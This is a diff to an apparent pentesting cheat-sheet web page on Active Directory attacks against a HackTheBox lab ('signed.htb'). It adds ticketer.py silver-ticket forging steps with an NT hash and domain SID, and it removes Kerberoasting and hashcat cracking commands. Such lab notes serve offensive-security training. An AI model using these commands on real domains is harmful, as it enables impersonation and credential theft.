@@ -72,7 +72,7 @@ Restore-ADObject -Identity $guid</code></pre>
             </ul>
             <h2>Exploitation</h2>
             <ul>
-                <h2>Certypy Attacks</h2>
+                <h2>Certipy Attacks</h2>
                 <div class="banner">
                     <a class="cherry-banner" href="certipy.html">
                         <h2>   Check for more information ↗️</h2>
@@ -194,9 +194,9 @@ Restore-ADObject -Identity $guid</code></pre>
                             <p>In order to perform this attack you'll need the following</p>
                             
                             <p>Generate HASH NTLM from the password of the service account. <a class="notion-link" href="https://www.browserling.com/tools/ntlm-hash">Use this website</a></p>
-                            <p>Get domain SUID</p>
+                            <p>Get domain SUID. Domain needs to be formatted and last part must be removed</p>
                             <pre><code class="language-bash">SELECT SUSER_SID('signed\mssqlsvc');</code></pre>
-                            <p>Domain needs to be formatted and last part must be removed</p>
+                            <p>Using ticketer to forge a ticket impersonating IT user </p>
                             <pre><code class="language-bash">ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc \                  
 -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
 -domain signed.htb \
@@ -204,19 +204,10 @@ Restore-ADObject -Identity $guid</code></pre>
 -user-id 1103 \
 -groups 1105 \        
 IT</code></pre>
-                            
-                            
-
-export KRB5CCNAME=/home/kali/Downloads/IT.ccache
-
-
-mssqlclient.py dc01.signed.htb -k 
-
-                            <pre><code class="language-bash"> impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request</code></pre>
-                            <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
-                            <pre><code class="language-bash">hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
-                            <p>Show the hash</p>
-                            <pre><code class="language-bash">hashcat --show -m 13100 hash</code></pre>  
+                            <p>Remember that -user-id and -groups are from the user which you are impersonating. -user-id can be obtained from last part of domain SUID</p>    
+                            <pre><code class="language-bash"> export KRB5CCNAME=/home/kali/Downloads/IT.ccache</code></pre>
+                            <p>Login using the ticket exported</p>
+                            <pre><code class="language-bash">mssqlclient.py dc01.signed.htb -k</code></pre>
                         </ul>
 
                         <h3>Golden Ticket Attack 📀</h3>
